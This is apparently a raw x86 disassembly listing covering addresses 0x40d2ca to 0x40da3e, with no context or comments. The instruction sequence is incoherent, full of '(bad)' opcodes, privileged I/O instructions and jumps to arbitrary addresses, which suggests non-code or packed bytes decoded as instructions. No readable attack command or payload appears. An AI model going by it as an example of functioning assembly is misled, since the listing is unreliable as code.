  40d2ca:	mov    dl,0x90
  40d2cc:	push   ebp
  40d2cd:	adc    BYTE PTR [ecx+0x7cd197e6],0xaa
  40d2d4:	push   ss
  40d2d5:	sbb    esi,ebx
  40d2d7:	push   ss
  40d2d8:	sbb    BYTE PTR [ebp+0x5a08b6f9],0xc9
  40d2df:	ins    DWORD PTR es:[edi],dx
  40d2e0:	push   cs
  40d2e1:	stc    
  40d2e2:	retf   0xb8ad
  40d2e5:	hlt    
  40d2e6:	mov    ds:0xb249c536,al
  40d2eb:	into   
  40d2ec:	(bad)  
  40d2ed:	ja     0x40d288
  40d2ef:	xor    DWORD PTR [esi+ebp*4-0x73],0xffffffa1
  40d2f4:	enter  0x17db,0x8c
  40d2f8:	pop    esi
  40d2f9:	scas   al,BYTE PTR es:[edi]
  40d2fa:	sub    cl,BYTE PTR [ebx]
  40d2fc:	arpl   di,sp
  40d2fe:	(bad)  
  40d2ff:	outs   dx,BYTE PTR ds:[esi]
  40d300:	pusha  
  40d301:	and    DWORD PTR [eax+0x1a],0x123eb421
  40d308:	loope  0x40d350
  40d30a:	hlt    
  40d30b:	inc    esp
  40d30c:	push   cs
  40d30d:	and    ah,bl
  40d30f:	mov    ah,0xe2
  40d311:	inc    edx
  40d312:	dec    esi
  40d314:	and    al,0x62
  40d316:	rol    BYTE PTR [ebx+ebx*1-0x1cc9787a],cl
  40d31d:	xchg   edi,eax
  40d31e:	pop    esp
  40d31f:	sbb    ebp,DWORD PTR [edi]
  40d321:	dec    bl
  40d323:	(bad)  
  40d324:	(bad)  
  40d325:	fnstcw WORD PTR [ebx-0x7dfbedc3]
  40d32b:	xchg   BYTE PTR [ecx+0x4f],dl
  40d32e:	pop    eax
  40d32f:	mov    BYTE PTR [edx-0x113a86ef],dl
  40d335:	xchg   esp,eax
  40d336:	jge    0x40d34f
  40d338:	xor    eax,DWORD PTR [esp+ebx*8+0x67]
  40d33c:	rcl    BYTE PTR [esi+0x40d0e060],1
  40d342:	fs pusha 
  40d344:	xchg   esp,eax
  40d345:	jg     0x40d32b
  40d347:	repnz mov ds:0x5b19b1a1,al
  40d34d:	sbb    cl,BYTE PTR ds:0x47ef557a
  40d353:	out    dx,eax
  40d354:	add    DWORD PTR [eax*8-0x337694b2],edx
  40d35b:	jne    0x40d314
  40d35d:	ins    DWORD PTR es:[edi],dx
  40d35e:	call   0x3eec0c76
  40d363:	xchg   esi,eax
  40d364:	push   ebp
  40d365:	mov    esi,0x268402e8
  40d36a:	mov    al,ds:0xbc8e984d
  40d36f:	jg     0x40d378
  40d371:	aad    0xed
  40d373:	cli    
  40d374:	jl     0x40d331
  40d376:	xchg   BYTE PTR [ebp-0x7705c163],dl
  40d37c:	daa    
  40d37d:	dec    edi
  40d37e:	mov    cl,0xeb
  40d380:	repz fist WORD PTR [edi-0xf]
  40d384:	imul   edi,DWORD PTR [ebp+0x18],0xffffffd2
  40d388:	push   ecx
  40d389:	dec    esp
  40d38a:	mov    bh,0x1d
  40d38c:	lock lock cmc 
  40d38f:	(bad)  
  40d390:	not    ebp
  40d392:	push   esp
  40d393:	cmc    
  40d394:	stc    
  40d395:	push   0x7a8d5c52
  40d39a:	je     0x40d389
  40d39c:	dec    eax
  40d39d:	jnp    0x40d355
  40d39f:	and    al,0xf1
  40d3a1:	mov    eax,ds:0x891aae41
  40d3a6:	outs   dx,BYTE PTR ds:[esi]
  40d3a7:	adc    eax,0xf1b4b5fb
  40d3ac:	fild   WORD PTR [edx-0x563c1f81]
  40d3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b3:	aaa    
  40d3b4:	lahf   
  40d3b5:	scas   al,BYTE PTR es:[edi]
  40d3b6:	jmp    0x40d3ca
  40d3b8:	int    0xdb
  40d3ba:	and    BYTE PTR [ecx+eax*1],dh
  40d3bd:	push   esi
  40d3be:	inc    esp
  40d3bf:	fwait
  40d3c0:	adc    ch,BYTE PTR [esi-0x629595d2]
  40d3c6:	sbb    ebx,ebp
  40d3c8:	(bad)  
  40d3c9:	pxor   mm2,QWORD PTR [edx+0x7d]
  40d3cd:	inc    eax
  40d3ce:	cmp    dl,dh
  40d3d0:	and    edi,esi
  40d3d2:	ins    BYTE PTR es:[edi],dx
  40d3d3:	fwait
  40d3d4:	icebp  
  40d3d5:	scas   eax,DWORD PTR es:[edi]
  40d3d6:	mov    esi,0x9e3390c2
  40d3db:	mov    eax,ds:0x5aaec7c4
  40d3e0:	aad    0x9f
  40d3e2:	jo     0x40d460
  40d3e4:	mov    ebx,0x29b25fb5
  40d3e9:	(bad)  
  40d3ea:	into   
  40d3eb:	sbb    ch,BYTE PTR [edi+0x5d]
  40d3ee:	in     al,0xc0
  40d3f0:	jle    0x40d3d6
  40d3f2:	out    0xfd,eax
  40d3f4:	std    
  40d3f5:	xchg   esp,eax
  40d3f6:	push   0x4f
  40d3f8:	enter  0xe200,0x3d
  40d3fc:	pop    edx
  40d3fd:	xchg   ebx,eax
  40d3fe:	push   0x28
  40d400:	or     BYTE PTR [eax-0x730a2a69],bh
  40d406:	(bad)  
  40d407:	cmc    
  40d408:	out    dx,eax
  40d409:	test   dh,bh
  40d40b:	and    al,0x65
  40d40d:	not    BYTE PTR [esi-0x5e777cb0]
  40d413:	nop
  40d414:	imul   ebx,esp,0xe24d875
  40d41a:	fidiv  WORD PTR [ebx-0x820bcf7]
  40d420:	lea    ecx,[ecx+0x34]
  40d423:	xor    esp,edx
  40d425:	icebp  
  40d426:	leave  
  40d427:	icebp  
  40d428:	pop    edi
  40d429:	(bad)  
  40d42a:	or     eax,0x5fdfbb3a
  40d42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d430:	in     eax,0x4f
  40d432:	inc    esp
  40d433:	test   esi,esp
  40d435:	sbb    esi,DWORD PTR [ebp-0x4c1cf3e6]
  40d43b:	push   ss
  40d43c:	aam    0xe
  40d43e:	jns    0x40d471
  40d440:	or     BYTE PTR [ebp-0x5e16f21c],bh
  40d446:	push   edi
  40d447:	xchg   edi,eax
  40d448:	sbb    cl,BYTE PTR [edx]
  40d44a:	addr16 dec ebx
  40d44c:	ins    DWORD PTR es:[di],dx
  40d44e:	and    esi,DWORD PTR [ebp+0x49]
  40d451:	mov    dl,BYTE PTR [ebx+0x123bee18]
  40d457:	or     BYTE PTR [ebp-0x40],dh
  40d45a:	cmp    ecx,DWORD PTR [edx-0x57]
  40d45d:	push   ds
  40d45e:	shl    DWORD PTR [ebx-0x58],0x28
  40d462:	mov    ds:0x41bab4bc,eax
  40d467:	lods   eax,DWORD PTR gs:[esi]
  40d469:	jno    0x40d407
  40d46b:	in     al,dx
  40d46c:	jle    0x40d4d9
  40d46e:	outs   dx,BYTE PTR ds:[esi]
  40d46f:	push   0x5d
  40d471:	icebp  
  40d472:	jne    0x40d429
  40d474:	sub    eax,0xd9167597
  40d479:	rcl    DWORD PTR [eax+edx*8-0x7117160a],1
  40d480:	sub    ebx,DWORD PTR [edx+0x2]
  40d483:	sub    DWORD PTR [eax-0x10215fcc],esp
  40d489:	and    bl,0x82
  40d48c:	es jns 0x40d509
  40d48f:	adc    al,0xfe
  40d491:	stos   DWORD PTR es:[edi],eax
  40d492:	mov    edi,DWORD PTR [ebx-0x7e]
  40d495:	test   eax,0x649b82c
  40d49a:	enter  0x7fc9,0x9a
  40d49e:	outs   dx,BYTE PTR ds:[esi]
  40d49f:	xchg   BYTE PTR [ebp+eiz*4-0x65d85e3a],bh
  40d4a6:	repnz int 0xfd
  40d4a9:	push   esp
  40d4aa:	dec    ecx
  40d4ab:	xchg   edi,eax
  40d4ad:	or     ebp,DWORD PTR [ebx+0x10909f2d]
  40d4b3:	imul   ecx,edx,0xe2420298
  40d4b9:	js     0x40d4cd
  40d4bb:	inc    esp
  40d4bc:	out    dx,eax
  40d4bd:	sub    BYTE PTR [ecx-0x2409a987],0x7
  40d4c4:	cmp    bh,0x4f
  40d4c7:	ror    ah,1
  40d4c9:	or     eax,0x3ed75f94
  40d4ce:	add    eax,0x8d8c1749
  40d4d3:	stos   DWORD PTR es:[edi],eax
  40d4d4:	(bad)  
  40d4d5:	mov    BYTE PTR [ebx-0x33258b03],dl
  40d4db:	pop    eax
  40d4dc:	or     eax,0xa3c010a6
  40d4e1:	sar    BYTE PTR [ebx+0x5],1
  40d4e4:	shl    BYTE PTR [ecx],0x40
  40d4e7:	push   0x1c
  40d4e9:	dec    edx
  40d4ea:	push   cs
  40d4eb:	dec    eax
  40d4ec:	xchg   ebp,eax
  40d4ed:	jge    0x40d49c
  40d4ef:	jo     0x40d527
  40d4f1:	mov    dh,0x49
  40d4f3:	retf   
  40d4f4:	out    dx,eax
  40d4f5:	cwde   
  40d4f6:	push   ebx
  40d4f7:	push   DWORD PTR [edx+0x7e20cc5]
  40d4fd:	shl    BYTE PTR [esi],0x4f
  40d500:	das    
  40d501:	inc    eax
  40d502:	xor    al,ah
  40d504:	pushf  
  40d505:	out    dx,eax
  40d506:	push   ss
  40d507:	xchg   dl,ch
  40d509:	dec    ebp
  40d50a:	lahf   
  40d50b:	aas    
  40d50c:	dec    eax
  40d50d:	xor    eax,0x7a04cc0f
  40d512:	jl     0x40d573
  40d514:	loop   0x40d498
  40d516:	dec    ecx
  40d517:	mov    bl,0x3a
  40d519:	mul    BYTE PTR [ebx]
  40d51b:	mov    ecx,0x32312052
  40d520:	movnti DWORD PTR [edx-0x1faff83d],esp
  40d527:	fisttp QWORD PTR [edx-0x1b65445e]
  40d52d:	pop    ebp
  40d52e:	cmc    
  40d52f:	nop
  40d530:	xor    dl,bl
  40d532:	xchg   edi,eax
  40d533:	sub    eax,0xd922130b
  40d538:	push   ebx
  40d539:	cmp    ah,BYTE PTR [ecx]
  40d53b:	xchg   ebx,eax
  40d53c:	aam    0x9f
  40d53e:	add    eax,0x1a06c41d
  40d543:	jb     0x40d5ac
  40d545:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0xffffffdd
  40d54a:	je     0x40d507
  40d54c:	daa    
  40d54d:	rcr    DWORD PTR [edi],1
  40d54f:	cmp    BYTE PTR [ebx],bh
  40d551:	inc    ebx
  40d552:	mov    cl,0xd6
  40d554:	mov    ds:0x9d56b13a,eax
  40d559:	jp     0x40d5c1
  40d55b:	xchg   edi,eax
  40d55c:	out    0x87,eax
  40d55e:	int3   
  40d55f:	call   0x1d2a6ab2
  40d564:	mov    esi,0xa5dff160
  40d569:	enter  0x842e,0x13
  40d56d:	and    al,0x91
  40d56f:	imul   ecx,DWORD PTR cs:[edi+0x2bccf7cb],0x5c
  40d577:	cdq    
  40d578:	sbb    al,0x7
  40d57a:	xchg   BYTE PTR [ecx+0x5f],ah
  40d57d:	xchg   edi,eax
  40d57e:	mov    ebx,0x8f34a422
  40d583:	inc    esp
  40d584:	sub    ebx,eax
  40d586:	mov    ah,0xc8
  40d588:	jbe    0x40d551
  40d58a:	fs xchg esp,eax
  40d58c:	pushf  
  40d58d:	mov    dl,0x7
  40d58f:	dec    edi
  40d590:	adc    BYTE PTR [ebx-0x3932ebe4],al
  40d596:	xchg   ebx,eax
  40d597:	jle    0x40d5ed
  40d599:	les    ebx,FWORD PTR ds:0xdc92ca6
  40d59f:	addr16 in al,dx
  40d5a1:	mov    dl,0x9c
  40d5a3:	cmc    
  40d5a4:	pop    ecx
  40d5a5:	sti    
  40d5a6:	imul   ebx,DWORD PTR [bx+si-0x71],0x8d01df79
  40d5ae:	mov    bh,BYTE PTR [edx+0x66066a0d]
  40d5b4:	xor    bl,BYTE PTR [eax-0x4a]
  40d5b7:	dec    esi
  40d5b8:	pop    eax
  40d5b9:	dec    edx
  40d5ba:	repnz ins DWORD PTR es:[edi],dx
  40d5bc:	mov    esi,cs
  40d5be:	lds    ebp,FWORD PTR [ebp+0x14b6fbd3]
  40d5c4:	cmp    BYTE PTR [ecx+0x42925bb5],dl
  40d5ca:	repnz iret 
  40d5cc:	call   0xed7b:0xa514ad75
  40d5d3:	das    
  40d5d4:	int3   
  40d5d5:	pop    ebx
  40d5d6:	inc    ebp
  40d5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d8:	out    dx,eax
  40d5d9:	inc    eax
  40d5da:	or     BYTE PTR [ebx],bl
  40d5dc:	sbb    bh,ch
  40d5de:	inc    esi
  40d5df:	cmc    
  40d5e0:	add    bl,BYTE PTR [ebx]
  40d5e2:	pop    esp
  40d5e3:	add    DWORD PTR [ecx+0x68976044],edi
  40d5e9:	arpl   di,dx
  40d5eb:	inc    esi
  40d5ec:	sub    BYTE PTR [eax],ah
  40d5ee:	or     DWORD PTR [edi-0x13],0xffffff8a
  40d5f2:	test   al,0x95
  40d5f4:	xchg   edi,eax
  40d5f5:	mov    BYTE PTR [ebp+0x264bc668],bh
  40d5fb:	xchg   ebp,eax
  40d5fc:	sbb    bh,0x3b
  40d5ff:	adc    ebx,esi
  40d601:	adc    al,0xff
  40d603:	push   ecx
  40d604:	cmp    DWORD PTR [ebx],edx
  40d606:	mov    edi,DWORD PTR [ebp-0x3e3c7af4]
  40d60c:	and    eax,0xc372082a
  40d611:	fadd   QWORD PTR [eax+esi*4]
  40d614:	cdq    
  40d615:	test   al,0x96
  40d617:	lea    esi,[edi+0x794bc45d]
  40d61d:	test   al,0x94
  40d61f:	stc    
  40d620:	ins    DWORD PTR es:[edi],dx
  40d621:	fnstenv [edi-0x52d1cea3]
  40d627:	test   bl,cl
  40d629:	mov    cl,ah
  40d62b:	mov    DWORD PTR [ecx-0x3f569de9],ebx
  40d631:	pusha  
  40d632:	xchg   esi,eax
  40d633:	leave  
  40d634:	fild   QWORD PTR gs:[eax+0x28]
  40d638:	jo     0x40d605
  40d63a:	xchg   edx,eax
  40d63b:	(bad)  
  40d63c:	sbb    eax,0x30e9009d
  40d641:	push   0xd8c39c6c
  40d646:	add    BYTE PTR [ebx+esi*1-0x55],cl
  40d64a:	int    0x39
  40d64c:	fstp   QWORD PTR ds:0xe3959e08
  40d652:	int3   
  40d653:	inc    ebx
  40d655:	sub    eax,0x7ddb7249
  40d65a:	mov    dl,BYTE PTR [edi+0x3a6c07b6]
  40d660:	dec    edi
  40d661:	stos   DWORD PTR es:[edi],eax
  40d662:	jg     0x40d608
  40d664:	inc    ebp
  40d665:	in     al,0xcc
  40d667:	rcl    ebp,1
  40d669:	push   ecx
  40d66a:	and    bl,BYTE PTR [ebp-0x60c52269]
  40d670:	and    eax,0x2060a174
  40d675:	pop    ds
  40d676:	pop    esp
  40d677:	ret    
  40d678:	loope  0x40d696
  40d67a:	cmp    cl,BYTE PTR [ebx-0x5e]
  40d67d:	test   al,0x87
  40d67f:	mov    ecx,esi
  40d681:	xor    DWORD PTR [eax+0x8984579],0xfffffff0
  40d688:	sub    ecx,DWORD PTR [ebx]
  40d68a:	adc    DWORD PTR [edx],ecx
  40d68c:	fild   DWORD PTR [ebp-0x20b5f001]
  40d692:	push   eax
  40d693:	stos   DWORD PTR es:[edi],eax
  40d694:	(bad)  
  40d695:	scas   eax,DWORD PTR es:[edi]
  40d696:	popf   
  40d697:	sub    eax,0x1b5c00e6
  40d69c:	retf   
  40d69d:	repz jmp 0x5fef:0xda6e3fe5
  40d6a5:	cld    
  40d6a6:	(bad)  
  40d6a7:	xchg   edi,eax
  40d6a8:	clc    
  40d6a9:	(bad)  
  40d6aa:	adc    al,0x5a
  40d6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6ad:	leave  
  40d6ae:	or     ah,BYTE PTR [ebp+ebx*2-0x318be808]
  40d6b5:	aaa    
  40d6b6:	stc    
  40d6b7:	fld    TBYTE PTR [ebx-0x25c3201f]
  40d6bd:	inc    esi
  40d6be:	mov    esi,0x8ca48d6a
  40d6c3:	xchg   BYTE PTR [edx-0x5d63c14],cl
  40d6c9:	xchg   edi,eax
  40d6ca:	xor    edi,ecx
  40d6cc:	sahf   
  40d6cd:	loop   0x40d6f7
  40d6cf:	dec    ecx
  40d6d0:	xor    edx,DWORD PTR [ebp+0x28]
  40d6d3:	(bad)  
  40d6d4:	ror    DWORD PTR [edi+ecx*2],1
  40d6d7:	je     0x40d732
  40d6d9:	or     ebp,DWORD PTR ds:0x915d0d6f
  40d6df:	(bad)  
  40d6e0:	jecxz  0x40d731
  40d6e2:	xchg   ebx,eax
  40d6e3:	dec    eax
  40d6e4:	cli    
  40d6e5:	jno    0x40d6df
  40d6e7:	xor    eax,0x99335995
  40d6ec:	sahf   
  40d6ed:	pop    ebp
  40d6ee:	pusha  
  40d6ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6f0:	cs loopne 0x40d764
  40d6f3:	and    BYTE PTR [edi-0x4e],dl
  40d6f6:	jb     0x40d6b1
  40d6f8:	hlt    
  40d6f9:	ret    0xe6e4
  40d6fc:	jge    0x40d753
  40d6fe:	adc    dh,dl
  40d700:	cmp    ebp,DWORD PTR [edx-0x43]
  40d703:	adc    ch,BYTE PTR [esi-0x2da1e17b]
  40d709:	and    eax,0x349b2dcf
  40d70e:	leave  
  40d70f:	icebp  
  40d710:	mov    ecx,0x5c1f7b12
  40d715:	or     ebp,ebx
  40d717:	js     0x40d709
  40d719:	(bad)  
  40d71b:	xor    al,0x74
  40d71d:	pop    edi
  40d71e:	and    eax,0x9fcf4405
  40d723:	jge    0x40d6fe
  40d725:	pushf  
  40d726:	and    DWORD PTR [ebx+0x17281c23],eax
  40d72c:	jle    0x40d757
  40d72e:	pop    eax
  40d72f:	jo     0x40d754
  40d731:	sti    
  40d732:	jns    0x40d716
  40d734:	mov    esi,0x8f975adc
  40d739:	test   esp,esp
  40d73b:	add    BYTE PTR [ebp-0x67],dh
  40d73e:	push   cs
  40d73f:	retf   
  40d740:	dec    ecx
  40d741:	jns    0x40d70f
  40d743:	pop    esp
  40d744:	cmp    edi,edi
  40d746:	push   ebx
  40d747:	mov    ch,0x73
  40d749:	mov    edi,edx
  40d74b:	mov    bh,0xbe
  40d74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d74e:	dec    ebp
  40d74f:	pop    ecx
  40d750:	out    dx,eax
  40d751:	ins    DWORD PTR es:[edi],dx
  40d752:	push   ss
  40d753:	fsubr  DWORD PTR [ecx-0x73]
  40d756:	in     eax,dx
  40d757:	fbstp  TBYTE PTR [ebp+eiz*1-0x20d622da]
  40d75e:	jns    0x40d6fe
  40d760:	pushf  
  40d761:	loop   0x40d70a
  40d763:	adc    BYTE PTR [ebx],ch
  40d765:	jg     0x40d773
  40d767:	or     eax,0xa5bde90e
  40d76c:	out    dx,eax
  40d76d:	les    ecx,FWORD PTR [ebx+0xd6dedb7]
  40d773:	in     al,0x2d
  40d775:	scas   al,BYTE PTR es:[edi]
  40d776:	bound  edx,QWORD PTR [esi-0x43]
  40d779:	xchg   edx,eax
  40d77a:	xor    DWORD PTR [ecx-0x34],edx
  40d77d:	xchg   edx,eax
  40d77e:	mov    eax,0xeec47849
  40d783:	mov    bh,0xc6
  40d785:	or     BYTE PTR [ebx+0x9113485],cl
  40d78b:	ret    
  40d78c:	mov    ebp,0xdf47443d
  40d791:	jo     0x40d752
  40d793:	mov    esp,0x6006ab63
  40d798:	dec    edx
  40d799:	adc    dl,cl
  40d79b:	cdq    
  40d79c:	cmp    bl,ch
  40d79e:	in     eax,0x80
  40d7a0:	mov    bl,0x7d
  40d7a2:	jg     0x40d772
  40d7a4:	jl     0x40d7ef
  40d7a6:	inc    edx
  40d7a7:	(bad)  
  40d7a8:	aas    
  40d7a9:	push   ebx
  40d7aa:	cmp    edx,DWORD PTR [eax]
  40d7ac:	xchg   ebx,eax
  40d7ad:	mov    cs,eax
  40d7af:	xor    ebp,eax
  40d7b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7b2:	test   al,0x6e
  40d7b4:	xchg   DWORD PTR [edi-0x389adb61],esp
  40d7ba:	or     bl,cl
  40d7bc:	jle    0x40d778
  40d7be:	lods   eax,DWORD PTR ds:[esi]
  40d7bf:	add    eax,0x162dfc9a
  40d7c4:	addr16 adc ebx,0xffffffa9
  40d7c8:	dec    ecx
  40d7c9:	push   es
  40d7ca:	jns    0x40d7de
  40d7cc:	mov    cl,BYTE PTR [ebx]
  40d7ce:	mov    ebp,0xec9d631a
  40d7d3:	push   cs
  40d7d4:	jae    0x40d77b
  40d7d6:	mov    ebx,0xe1efe2d9
  40d7db:	mov    esi,0x86794b27
  40d7e0:	xchg   DWORD PTR [eax],edi
  40d7e2:	adc    al,BYTE PTR [ebp-0x799bfc49]
  40d7e8:	icebp  
  40d7e9:	(bad)  
  40d7ea:	std    
  40d7eb:	and    BYTE PTR [edi],cl
  40d7ed:	jecxz  0x40d82b
  40d7ef:	push   0x7b
  40d7f1:	mov    cs,WORD PTR [ebx-0x2170239c]
  40d7f7:	push   es
  40d7f8:	mov    cl,0x19
  40d7fa:	jne    0x40d7a6
  40d7fc:	out    0xb4,al
  40d7fe:	xlat   BYTE PTR ds:[ebx]
  40d7ff:	stos   DWORD PTR es:[edi],eax
  40d800:	mov    WORD PTR [edi-0x349b0b99],?
  40d806:	das    
  40d807:	mov    dl,0xcc
  40d809:	and    edx,ebx
  40d80b:	mov    esp,DWORD PTR [ebx+0x43]
  40d80e:	pop    eax
  40d80f:	push   0xe235a07b
  40d814:	rol    DWORD PTR [edi+0x73d7d581],cl
  40d81a:	and    al,0xd2
  40d81c:	fisubr DWORD PTR [edi+0x59]
  40d81f:	aaa    
  40d820:	(bad)  [edi]
  40d822:	push   ss
  40d823:	enter  0xd499,0x3e
  40d827:	pop    edi
  40d828:	or     esi,DWORD PTR [ebp+0x40b2ca1d]
  40d82e:	aam    0xb4
  40d830:	ins    BYTE PTR es:[edi],dx
  40d831:	fimul  WORD PTR [esi]
  40d833:	pop    es
  40d834:	sub    DWORD PTR [ebp-0x329a5ab9],eax
  40d83a:	mov    cl,0x2
  40d83c:	jbe    0x40d881
  40d83e:	push   ss
  40d83f:	xchg   esi,eax
  40d840:	(bad)  
  40d841:	mov    ds:0x1459f415,al
  40d846:	(bad)  
  40d847:	or     esp,DWORD PTR [ecx+ebx*8+0x4b37e6c1]
  40d84e:	lock shl BYTE PTR [esi],0x41
  40d852:	call   0x8f2cd8a4
  40d857:	jns    0x40d7d9
  40d859:	cs loopne 0x40d80b
  40d85c:	mov    ds,WORD PTR [ebx+ecx*8-0x5b]
  40d860:	in     eax,dx
  40d861:	or     eax,0x79961ecd
  40d866:	enter  0x4571,0x18
  40d86a:	aas    
  40d86b:	mov    bl,BYTE PTR [ebp+0x6c]
  40d86e:	setne  BYTE PTR [eax+ebx*8+0x25d308eb]
  40d876:	mov    ebx,0x164e6507
  40d87b:	lods   al,BYTE PTR ds:[esi]
  40d87c:	or     bh,bh
  40d87e:	data16 cmp ah,BYTE PTR [edx]
  40d881:	neg    BYTE PTR [ecx]
  40d883:	xchg   BYTE PTR [edi+0x4a],bh
  40d886:	ins    BYTE PTR es:[edi],dx
  40d887:	mov    bh,0xfa
  40d889:	mov    edx,0xb9bfa4ff
  40d88e:	or     BYTE PTR [edi+0x4d3feec3],cl
  40d894:	fsub   QWORD PTR [esi]
  40d896:	and    BYTE PTR [eax],0x52
  40d899:	mov    bl,0xa
  40d89b:	mov    ah,0xd1
  40d89d:	std    
  40d89e:	xlat   BYTE PTR ds:[ebx]
  40d89f:	cmp    dl,BYTE PTR [ecx-0x648f7692]
  40d8a5:	clc    
  40d8a6:	pop    esp
  40d8a8:	sbb    ah,BYTE PTR [ebp-0xe]
  40d8ab:	mov    ebp,0xb0d85f2b
  40d8b0:	cmp    al,0x87
  40d8b2:	jne    0x40d8ca
  40d8b4:	pop    esp
  40d8b5:	xlat   BYTE PTR ds:[ebx]
  40d8b6:	pop    edi
  40d8b7:	jns    0x40d895
  40d8b9:	jmp    0xf1ce50dc
  40d8be:	dec    edi
  40d8bf:	cmc    
  40d8c0:	adc    DWORD PTR [edi-0x7e],edx
  40d8c3:	outs   dx,DWORD PTR ds:[esi]
  40d8c4:	rcr    edx,0x4e
  40d8c7:	ficom  DWORD PTR [ebx-0x6a3ecac2]
  40d8cd:	std    
  40d8ce:	sti    
  40d8cf:	pop    eax
  40d8d0:	push   ecx
  40d8d1:	scas   al,BYTE PTR es:[edi]
  40d8d2:	scas   al,BYTE PTR es:[edi]
  40d8d3:	cld    
  40d8d4:	popf   
  40d8d5:	add    cl,BYTE PTR [eax]
  40d8d7:	js     0x40d85d
  40d8d9:	mov    al,0xb3
  40d8db:	fdiv   QWORD PTR [ecx]
  40d8dd:	or     bl,BYTE PTR [edx+edx*8-0xdec225b]
  40d8e4:	out    0x46,al
  40d8e6:	pop    esi
  40d8e7:	adc    eax,0x8ef90aa2
  40d8ec:	call   0x82ee80f6
  40d8f1:	xchg   ebp,eax
  40d8f2:	clc    
  40d8f3:	stc    
  40d8f4:	outs   dx,DWORD PTR ds:[esi]
  40d8f5:	shl    DWORD PTR [edi-0x3695898c],cl
  40d8fb:	and    al,0xc7
  40d8fd:	shr    cl,1
  40d8ff:	or     DWORD PTR [edi],0x4ee8724c
  40d905:	pop    esi
  40d906:	or     DWORD PTR [edi-0x13374de7],0xffffffd1
  40d90d:	stos   DWORD PTR es:[edi],eax
  40d90e:	push   cs
  40d90f:	lea    ebp,[eax+0x1c]
  40d912:	lahf   
  40d913:	pop    edx
  40d914:	ret    
  40d915:	push   ebp
  40d916:	sub    BYTE PTR [edx],0xac
  40d919:	popa   
  40d91a:	pop    ebx
  40d91b:	inc    edi
  40d91c:	lods   eax,DWORD PTR ds:[esi]
  40d91d:	jmp    0x40d964
  40d91f:	imul   eax,DWORD PTR [esi+0x51],0x27
  40d923:	xchg   esp,eax
  40d924:	xor    dh,BYTE PTR [ecx]
  40d926:	inc    eax
  40d927:	test   DWORD PTR [ebx+eiz*8+0x1288f6ff],ebp
  40d92e:	sub    eax,0x73ea0f76
  40d933:	les    eax,FWORD PTR [edx-0x70]
  40d936:	and    DWORD PTR [ecx+0x4b3059db],ebx
  40d93c:	add    cl,BYTE PTR [ecx-0x10625804]
  40d942:	pusha  
  40d943:	pushf  
  40d944:	xchg   ebx,eax
  40d945:	adc    ecx,DWORD PTR ds:0x354a6894
  40d94b:	mov    bl,0x79
  40d94d:	mov    edi,0x756b2720
  40d952:	xchg   esi,eax
  40d953:	test   eax,0x7014176c
  40d958:	idiv   DWORD PTR ss:[ebp+0x64]
  40d95c:	adc    ah,BYTE PTR [esi]
  40d95e:	int    0x91
  40d960:	call   0xf6f9de9a
  40d965:	lock mov ds:0x82d0ed5e,eax
  40d96b:	fnsave [ebx+ecx*8+0x43db87c7]
  40d972:	mov    ds:0xbc33510e,eax
  40d977:	xchg   ebp,eax
  40d978:	xchg   esp,eax
  40d979:	imul   edi,DWORD PTR [ebp-0x633d13d7],0x5d
  40d980:	jae    0x40d9b9
  40d982:	jo     0x40d957
  40d984:	mov    bl,0x2b
  40d986:	test   eax,0x7d6d0264
  40d98b:	or     DWORD PTR [eax+eiz*4-0x27],edx
  40d98f:	xor    DWORD PTR [esi-0x54],eax
  40d992:	mov    cs,WORD PTR [ecx-0x3e]
  40d995:	jmp    0x40d9f3
  40d997:	mov    ecx,0x66bc6532
  40d99c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d99d:	push   DWORD PTR [esi]
  40d99f:	shl    BYTE PTR [esi-0x69],1
  40d9a2:	das    
  40d9a3:	pop    edx
  40d9a4:	or     DWORD PTR [esi+0x41a6de66],esp
  40d9aa:	mov    ebp,0xa1edf1a9
  40d9af:	inc    esi
  40d9b0:	jp     0x40d9c0
  40d9b2:	ja     0x40d9bc
  40d9b4:	inc    edx
  40d9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9b6:	xor    al,BYTE PTR [ebp-0x59]
  40d9b9:	jae    0x40d9a1
  40d9bb:	push   esp
  40d9bc:	or     cl,dl
  40d9be:	push   edx
  40d9bf:	test   eax,0xba8000c7
  40d9c4:	xchg   edx,eax
  40d9c5:	pop    ebx
  40d9c6:	inc    eax
  40d9c7:	push   ss
  40d9c8:	and    eax,0xef5e49d
  40d9cd:	call   0xc1c5:0xdcb38995
  40d9d4:	xor    eax,0xcf84d034
  40d9d9:	(bad)  
  40d9da:	push   ecx
  40d9db:	cdq    
  40d9dc:	xor    DWORD PTR [eax+edi*8+0x6d35fbf2],0x18
  40d9e4:	lahf   
  40d9e5:	in     eax,dx
  40d9e6:	inc    ebx
  40d9e7:	(bad)  
  40d9e8:	mov    ebp,0x1fe959bb
  40d9ed:	inc    esp
  40d9ee:	scas   al,BYTE PTR es:[edi]
  40d9ef:	daa    
  40d9f0:	mov    edx,0x37bcaf2
  40d9f5:	add    eax,0x4b8019d8
  40d9fa:	adc    ebx,DWORD PTR [edi+0x25]
  40d9fd:	fyl2xp1 
  40d9ff:	outs   dx,DWORD PTR ds:[esi]
  40da00:	push   ss
  40da01:	fidivr DWORD PTR [edx+0x295ff819]
  40da07:	push   ebx
  40da08:	xchg   edx,eax
  40da09:	loop   0x40d9bd
  40da0b:	loopne 0x40d98f
  40da0d:	inc    ebp
  40da0e:	mov    edi,0x1e455292
  40da13:	(bad)  
  40da14:	mov    DWORD PTR [ecx],esp
  40da16:	sub    eax,0x3dd4c8bd
  40da1b:	jo     0x40da1b
  40da1d:	out    0x52,al
  40da1f:	mov    ah,0xe0
  40da21:	jne    0x40da67
  40da23:	push   0xc3f67bb1
  40da28:	cmp    BYTE PTR [edi+ecx*2],ch
  40da2b:	pop    esp
  40da2c:	fnsave [ebx+0xb5a835d]
  40da32:	mov    bh,0x9a
  40da34:	jg     0x40d9e3
  40da36:	jb     0x40d9ff
  40da38:	fisubr WORD PTR ds:0xeb242418
  40da3e:	pop    ds
